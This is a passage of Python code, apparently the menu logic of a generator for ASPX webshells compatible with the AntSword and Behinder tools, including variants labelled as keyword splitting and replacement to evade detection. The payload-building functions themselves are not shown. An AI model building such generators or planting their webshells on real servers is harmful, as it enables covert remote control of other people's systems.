    else:
        sys.exit()

elif choice == 'aspx':
#aspx
    choice7=g.choicebox(msg1,title,Type_choice)
    if choice7=='AntSword':
        #蚁剑webshell
        g.msgbox(build_aspx_AntSword_func_shell(),'webshell')
        sys.exit()
    
    elif choice7=='Behinder':
        #冰蝎webshell
        msg5="选项1为关键字分离及替换，选项2为关键字分离"
        aspx_Behinder_shell_choice=['1','2']
        choice7=g.choicebox(msg5,title,aspx_Behinder_shell_choice)
        if choice7=='1':

            g.msgbox(build_aspx_Behinder_1_shell(),'webshell')
            sys.exit()
        elif choice7=='2':
            g.msgbox(build_aspx_Behinder_2_shell(),'webshell')
            sys.exit()
        else:
            sys.exit()
    else:
        sys.exit()
else :
    sys.exit()